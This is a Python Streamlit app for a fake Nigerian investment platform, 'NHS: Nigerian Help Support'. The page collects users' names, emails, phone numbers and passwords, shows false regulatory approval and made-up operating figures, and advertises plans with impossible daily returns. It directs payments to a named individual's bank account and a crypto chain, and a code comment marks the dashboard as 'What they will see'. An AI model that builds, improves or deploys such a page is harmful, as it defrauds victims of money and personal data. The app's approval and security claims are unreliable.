import streamlit as st
import pandas as pd
import random

# --- PAGE CONFIG ---
st.set_page_config(page_title="NHS | Portal", page_icon="📈", layout="wide")

# --- PREMIUM CSS (Fixing Button & Design) ---
st.markdown("""
    <style>
    .stApp { background: #f0f7ff; color: #1e293b; }
    
    /* Registration Card */
    .reg-card {
        background: white; padding: 30px; border-radius: 20px;
        box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0;
    }
    
    /* Large Blue Button Fix */
    div.stButton > button {
        background-color: #00aeef !important;
        color: white !important;
        border: none !important;
        border-radius: 50px !important;
        padding: 20px !important;
        width: 100% !important;
        font-weight: bold !important;
        font-size: 20px !important;
        height: 60px !important;
        box-shadow: 0 4px 15px rgba(0,174,239,0.4) !important;
    }
    
    /* Navigation Tabs Styling */
    .stTabs [data-baseweb="tab-list"] { gap: 10px; }
    .stTabs [data-baseweb="tab"] {
        background-color: #ffffff; border-radius: 10px; padding: 10px 20px;
        color: #64748b; border: 1px solid #e2e8f0;
    }
    .stTabs [aria-selected="true"] {
        background-color: #00aeef !important; color: white !important;
    }
    </style>
""", unsafe_allow_html=True)

# --- APP LOGIC ---
if "registered" not in st.session_state:
    st.session_state.registered = False

# --- REGISTRATION SCREEN ---
if not st.session_state.registered:
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        st.markdown("<h2 style='text-align:center;'>Create account</h2>", unsafe_allow_html=True)
        st.markdown("<p style='text-align:center; color:#64748b;'>Join thousands building their future on NHS.</p>", unsafe_allow_html=True)
        
        with st.container():
            f_name = st.text_input("First name", placeholder="e.g. David")
            l_name = st.text_input("Last name", placeholder="e.g. Edet")
            u_name = st.text_input("Username", placeholder="Choose username")
            email = st.text_input("Email address", placeholder="name@example.com")
            phone = st.text_input("Phone number", placeholder="081...")
            ref = st.text_input("Referral (optional)", value="okonaneozeng")
            pwd = st.text_input("Password", type="password")
            
            # Simplified trigger: If they click, they go in!
            if st.button("COMPLETE REGISTRATION"):
                st.session_state.username = u_name if u_name else "User"
                st.session_state.registered = True
                st.rerun()

# --- THE REAL DASHBOARD (What they will see) ---
else:
    st.markdown(f"### Welcome back, {st.session_state.username} 👋")
    
    tab1, tab2, tab3 = st.tabs(["🏠 Home", "💰 Invest", "👤 My"])

    with tab1:
        st.markdown("## NHS: Nigerian Help Support")
        st.info("Approved by NHPC | Tier-1 Asset Management Platform")
        st.write("Current global infrastructure partners: 14 | Active nodes: 124,000+")
        st.image("https://images.unsplash.com/photo-1579546929518-9e396f3cc809?auto=format&fit=crop&w=800&q=80", caption="NHS Global Operations Network")

    with tab2:
        st.markdown("## Investment Portfolios")
        # VIP 1
        with st.expander("VIP 1 - Agricultural Logistics"):
            st.write("Cost: ₦5,000 | Daily: ₦1,150 | Term: 30 Days")
            if st.button("Subscribe to VIP 1"):
                st.success("Redirecting to Moniepoint Clearing Gateway...")
        
        # VIP 5
        with st.expander("VIP 5 - Global Supply Chain"):
            st.write("Cost: ₦130,000 | Daily: ₦15,000 | Term: 20 Days")
            if st.button("Subscribe to VIP 5"):
                st.warning("Contact Escrow Agent for High-Volume Clearance.")

    with tab3:
        st.markdown("## Client Account Node")
        c1, c2 = st.columns(2)
        c1.metric("Wallet Balance", "₦0.00")
        c2.metric("Active Contracts", "0")
        
        st.divider()
        st.markdown("#### Official Settlement Data")
        st.markdown("""
        - **Bank:** Moniepoint
        - **Account:** 8126419410 (Eric Kingsley Edet)
        - **Crypto:** BNB Smart Chain (BEP20)
        """)
        st.write("---")
        st.caption("🔒 Verified by NHPC | Security Protocol 2026-X99")
            
